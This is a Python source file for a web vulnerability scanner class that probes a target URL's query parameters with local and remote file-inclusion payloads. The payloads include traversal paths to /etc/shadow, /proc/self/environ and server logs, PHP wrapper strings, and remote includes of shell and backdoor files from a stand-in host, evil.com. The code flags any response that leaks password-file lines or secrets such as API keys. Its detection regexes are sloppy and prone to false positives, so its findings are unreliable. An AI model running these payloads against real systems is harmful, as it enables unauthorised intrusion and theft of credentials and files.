import re
import time
import os
from urllib.parse import urlparse, parse_qs
from colorama import Fore, Style

class LFIRFIScanner:
    def __init__(self):
        self.name = "LFI/RFI Scanner"
        self.version = "2.2"
        self.lfi_payloads = [
            "../../../../etc/passwd",
            "../../../../etc/hosts",
            "../../../../etc/group",
            "../../../../etc/shadow",
            "....//....//....//....//etc/passwd",
            "../../../../windows/win.ini",
            "../../../../boot.ini",
            "../../../../windows/system32/drivers/etc/hosts",
            "file:///etc/passwd",
            "/etc/passwd",
            "../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "../../../../proc/self/environ",
            "../../../../var/log/auth.log",
            "../../../../var/log/apache2/access.log",
            "../../../../var/log/nginx/access.log",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/resource=index.php",
            "expect://ls",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
            "zip://path/to/archive.zip#file.txt",
            "phar://path/to/archive.phar/file.txt"
        ]
        
        self.rfi_payloads = [
            "http://evil.com/shell.txt",
            "https://raw.githubusercontent.com/evil/shell/master/backdoor.php",
            "ftp://evil.com/shell.php",
            "\\\\evil.com\\share\\shell.php",
            "http://localhost:8080/exploit",
            "https://pastebin.com/raw/XXXXXX",
            "data:text/plain,<?php system('id'); ?>",
            "expect://whoami",
            "php://input"
        ]
    
    def scan(self, target, options=None):
        """Scan for LFI/RFI vulnerabilities"""
        from utils.request_wrapper import RequestWrapper
        
        results = {
            'vulnerabilities': [],
            'tested_payloads': 0,
            'timestamp': time.time()
        }
        
        try:
            req = RequestWrapper()
            
            # Parse URL
            parsed_url = urlparse(target)
            query_params = parse_qs(parsed_url.query)
            
            # Common LFI/RFI parameters
            lfi_params = ['file', 'page', 'dir', 'path', 'document', 'folder', 
                         'root', 'cat', 'action', 'board', 'date', 'detail', 
                         'download', 'prefix', 'include', 'inc', 'locate', 
                         'show', 'doc', 'site', 'type', 'view', 'content', 
                         'layout', 'mod', 'conf']
            
            # Test each parameter
            for param in query_params:
                for payload in self.lfi_payloads[:10]:  # Test first 10 LFI payloads
                    test_params = query_params.copy()
                    test_params[param] = payload
                    
                    # Test request
                    response = req.get(target, params=test_params)
                    
                    if self.detect_lfi(response):
                        vuln = {
                            'type': 'Local File Inclusion (LFI)',
                            'parameter': param,
                            'payload': payload,
                            'url': response.url,
                            'evidence': self.extract_lfi_evidence(response)
                        }
                        results['vulnerabilities'].append(vuln)
                        print(f"{Fore.RED}[!] LFI found in param: {param}")
                        break
                    
                    results['tested_payloads'] += 1
            
            # Test RFI
            for param in query_params:
                for payload in self.rfi_payloads[:5]:  # Test first 5 RFI payloads
                    test_params = query_params.copy()
                    test_params[param] = payload
                    
                    try:
                        response = req.get(target, params=test_params, timeout=10)
                        
                        if self.detect_rfi(response):
                            vuln = {
                                'type': 'Remote File Inclusion (RFI)',
                                'parameter': param,
                                'payload': payload,
                                'url': response.url,
                                'evidence': self.extract_rfi_evidence(response)
                            }
                            results['vulnerabilities'].append(vuln)
                            print(f"{Fore.RED}[!] RFI found in param: {param}")
                            break
                    except:
                        continue
                    
                    results['tested_payloads'] += 1
            
            return results
            
        except Exception as e:
            print(f"{Fore.RED}[-] LFI/RFI scan error: {e}")
            return results
    
    def detect_lfi(self, response):
        """Detect LFI in response"""
        lfi_indicators = [
            r'root:x:\d+:\d+:',
            r'daemon:x:\d+:\d+:',
            r'bin:x:\d+:\d+:',
            r'sys:x:\d+:\d+:',
            r'\[boot loader\]',
            r'\[fonts\]',
            r'\[extensions\]',
            r'\[files\]',
            r'\[Mail\]',
            r'PATH=/usr/local/sbin',
            r'HTTP_USER_AGENT=',
            r'DOCUMENT_ROOT=',
            r'REMOTE_ADDR=',
            r'HTTP_ACCEPT='
        ]
        
        response_text = response.text
        
        for pattern in lfi_indicators:
            if re.search(pattern, response_text):
                return True
        
        # Check for PHP errors
        php_errors = [
            r'failed to open stream',
            r'No such file or directory',
            r'open_basedir restriction',
            r'Warning.*include',
            r'Warning.*require'
        ]
        
        for error in php_errors:
            if re.search(error, response_text, re.IGNORECASE):
                return True
        
        return False
    
    def detect_rfi(self, response):
        """Detect RFI in response"""
        rfi_indicators = [
            r'evil\.com',
            r'raw\.githubusercontent',
            r'pastebin',
            r'<?php',
            r'system\(',
            r'eval\(',
            r'base64_decode'
        ]
        
        response_text = response.text
        
        for pattern in rfi_indicators:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        return False
    
    def extract_lfi_evidence(self, response):
        """Extract LFI evidence"""
        evidence = {
            'status_code': response.status_code,
            'content_length': len(response.content),
            'sensitive_data_found': False
        }
        
        # Look for sensitive data patterns
        sensitive_patterns = [
            r'root:.*:0:0:',
            r'Database password',
            r'DB_PASSWORD=',
            r'API_KEY=',
            r'SECRET_KEY=',
            r'password.*='
        ]
        
        for pattern in sensitive_patterns:
            if re.search(pattern, response.text):
                evidence['sensitive_data_found'] = True
                break
        
        return evidence
    
    def extract_rfi_evidence(self, response):
        """Extract RFI evidence"""
        evidence = {
            'status_code': response.status_code,
            'content_length': len(response.content),
            'remote_content_detected': False
        }
        
        # Check for remote content indicators
        if 'evil.com' in response.text or '<?php' in response.text:
            evidence['remote_content_detected'] = True
        
        return evidence